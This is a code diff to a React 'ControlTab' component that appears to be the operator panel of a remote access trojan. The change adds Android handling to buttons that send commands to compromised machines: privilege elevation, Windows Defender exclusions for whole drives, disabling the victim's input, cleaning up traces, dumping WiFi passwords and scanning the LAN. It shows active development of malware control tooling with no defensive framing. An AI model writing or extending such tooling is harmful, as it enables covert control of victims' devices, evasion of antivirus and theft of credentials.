@@ -56,10 +56,13 @@ import { toast } from "sonner";
 const ControlTab = ({
   machineId,
   machineName,
+  clientOs,
 }: {
   machineId: string;
   machineName: string;
+  clientOs?: string | null;
 }) => {
+  const isAndroid = clientOs?.toLowerCase().includes("android") ?? false;
   const [confirmAction, setConfirmAction] = useState<{
     command: string;
     label: string;
@@ -176,48 +179,44 @@ const ControlTab = ({
           <ActionBtn icon={Unlock} label="Remove Persistence" command="unpersist" />
           <ActionBtn
             icon={ShieldAlert}
-            label="Elevate UAC"
-            command="elevate"
+            label={isAndroid ? "Check Root" : "Elevate UAC"}
+            command={isAndroid ? "isadmin" : "elevate"}
             awaitResult
           />
-          <ActionBtn icon={ShieldCheck} label="Check Admin" command="isadmin" awaitResult />
+          <ActionBtn icon={ShieldCheck} label={isAndroid ? "Root Status" : "Check Admin"} command="isadmin" awaitResult />
         </CardContent>
       </Card>
 
-      {/* Defender Exclusions */}
-      <Card className="border-border/30">
-        <CardHeader className="pb-2">
-          <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
-            <ShieldOff className="w-3.5 h-3.5 text-primary" /> Defender Exclusions
-          </CardTitle>
-        </CardHeader>
-        <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
-          <ActionBtn icon={ShieldOff} label="Exclude C:" command="excludec" awaitResult />
-          <ActionBtn icon={ShieldOff} label="Exclude All Drives" command="excludeall" awaitResult />
-        </CardContent>
-      </Card>
+      {/* Defender / Security — hide on Android */}
+      {!isAndroid && (
+        <Card className="border-border/30">
+          <CardHeader className="pb-2">
+            <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
+              <ShieldOff className="w-3.5 h-3.5 text-primary" /> Defender Exclusions
+            </CardTitle>
+          </CardHeader>
+          <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
+            <ActionBtn icon={ShieldOff} label="Exclude C:" command="excludec" awaitResult />
+            <ActionBtn icon={ShieldOff} label="Exclude All Drives" command="excludeall" awaitResult />
+          </CardContent>
+        </Card>
+      )}
 
-      {/* IO & Control */}
+      {/* Agent Control */}
       <Card className="border-border/30">
         <CardHeader className="pb-2">
           <CardTitle className="text-xs text-muted-foreground flex items-center gap-2">
-            <MousePointer className="w-3.5 h-3.5 text-primary" /> Input / Output Control
+            <MousePointer className="w-3.5 h-3.5 text-primary" /> Agent Control
           </CardTitle>
         </CardHeader>
         <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
-          <ActionBtn
-            icon={MousePointerClick}
-            label="Disable IO"
-            command="disableio"
-            danger
-          />
-          <ActionBtn icon={MousePointer} label="Enable IO" command="enableio" />
-          <ActionBtn
-            icon={Power}
-            label="Disconnect Agent"
-            command="exit"
-            danger
-          />
+          {!isAndroid && (
+            <>
+              <ActionBtn icon={MousePointerClick} label="Disable IO" command="disableio" danger />
+              <ActionBtn icon={MousePointer} label="Enable IO" command="enableio" />
+            </>
+          )}
+          <ActionBtn icon={Power} label="Disconnect Agent" command="exit" danger />
           <ActionBtn icon={Trash2} label="Cleanup Traces" command="cleanup" danger awaitResult />
         </CardContent>
       </Card>
@@ -230,7 +229,7 @@ const ControlTab = ({
           </CardTitle>
         </CardHeader>
         <CardContent className="grid grid-cols-2 md:grid-cols-4 gap-2">
-          <ActionBtn icon={Wifi} label="WiFi Passwords" command="wifi" awaitResult />
+          <ActionBtn icon={Wifi} label={isAndroid ? "WiFi Info" : "WiFi Passwords"} command="wifi" awaitResult />
           <ActionBtn icon={Globe} label="Nearby WiFi" command="nearbywifi" awaitResult />
           <ActionBtn icon={Network} label="LAN Scan" command="enumeratelan" awaitResult />
           <ActionBtn icon={FolderTree} label="Folder Tree" command="foldertree" awaitResult />
